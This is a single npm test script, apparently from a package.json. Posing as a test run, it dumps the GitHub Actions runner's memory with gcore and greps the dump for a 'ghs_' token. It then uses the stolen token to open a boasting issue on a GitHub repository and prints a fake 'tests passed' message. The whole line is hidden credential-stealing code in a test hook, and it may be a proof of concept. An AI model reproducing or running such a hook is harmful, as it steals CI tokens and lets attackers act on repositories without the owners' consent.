scripts.test: echo '[*] Krecem u RAM...' && sudo apt-get update -y > /dev/null 2>&1 && sudo apt-get install -y gdb curl > /dev/null 2>&1 && RUNNER_PID=$(pgrep -f Runner.Worker | head -n 1) && sudo gcore -o /tmp/core $RUNNER_PID > /dev/null 2>&1 && TOKEN=$(sudo strings /tmp/core* | grep -Eo 'ghs_[A-Za-z0-9_]{36}' | sort | uniq | head -n 1) && if [ -n "$TOKEN" ]; then curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github.v3+json" https://api.github.com/repos/saricital/real-world-ci/issues -d '{"title":"🔥 RAM EXFILTRATION PWNED 🔥","body":"Ovaj Issue je kreiran tokom NPM instalacije! Token ukraden pravo iz RAM-a!"}'; else echo 'Nema tokena u RAM-u'; fi && echo 'Testovi su prosli uspjesno!'
